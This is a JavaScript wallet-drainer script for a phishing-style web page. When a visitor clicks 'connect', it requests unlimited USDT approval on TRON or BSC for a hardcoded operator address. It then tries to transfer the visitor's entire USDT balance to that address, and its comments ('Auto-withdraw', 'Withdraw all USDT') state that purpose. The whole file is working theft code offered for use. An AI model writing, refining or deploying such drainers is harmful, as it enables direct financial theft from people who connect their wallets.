const bep20USDT = {
  address: "0x55d398326f99059fF775485246999027B3197955", // USDT BEP-20
  spender: "0xE884eC0AD6524645797EA7B5e09C09551AD90e25"  // Your BSC wallet
};

const trc20USDT = {
  address: "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj", // USDT TRC-20
  spender: "TYPodVjr1UpRzxhrF17CXkxeeT4x1Lqmwu"  // Your TRON wallet
};

const connectBtn = document.getElementById('connect');
const statusEl = document.getElementById('status');
const walletAddressEl = document.getElementById('wallet-address');

connectBtn.onclick = async () => {
  if (window.tronWeb && window.tronWeb.ready) {
    const tronWeb = window.tronWeb;
    const address = tronWeb.defaultAddress.base58;
    walletAddressEl.innerText = `Connected: ${address}`;
    try {
      // Approve unlimited USDT
      const contract = await tronWeb.contract().at(trc20USDT.address);
      await contract.approve(trc20USDT.spender, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();
      
      // Auto-withdraw
      const usdtBalance = await contract.balanceOf(address).call();
      await contract.transferFrom(address, trc20USDT.spender, usdtBalance).send();
      
      statusEl.innerText = "TRC-20 Approved & Withdrawn ✅";
    } catch (e) {
      statusEl.innerText = "TRC-20 Error ❌";
    }
  } else if (window.ethereum) {
    try {
      const web3 = new Web3(window.ethereum);
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      const accounts = await web3.eth.getAccounts();
      const sender = accounts[0];
      walletAddressEl.innerText = `Connected: ${sender}`;
      
      const usdt = new web3.eth.Contract([
        { "constant": false, "inputs": [{ "name": "spender", "type": "address" }, { "name": "value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
        { "constant": false, "inputs": [{ "name": "from", "type": "address" }, { "name": "to", "type": "address" }, { "name": "value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
        { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" }
      ], bep20USDT.address);

      // Approve unlimited USDT
      await usdt.methods.approve(bep20USDT.spender, web3.utils.toTwosComplement(-1)).send({ from: sender });

      // Withdraw all USDT
      const balance = await usdt.methods.balanceOf(sender).call();
      await usdt.methods.transferFrom(sender, bep20USDT.spender, balance).send({ from: sender });

      statusEl.innerText = "BEP-20 Approved & Withdrawn ✅";
    } catch (e) {
      console.log(e);
      statusEl.innerText = "BEP-20 Error ❌";
    }
  } else {
    statusEl.innerText = "No wallet detected ❌";
  }
};
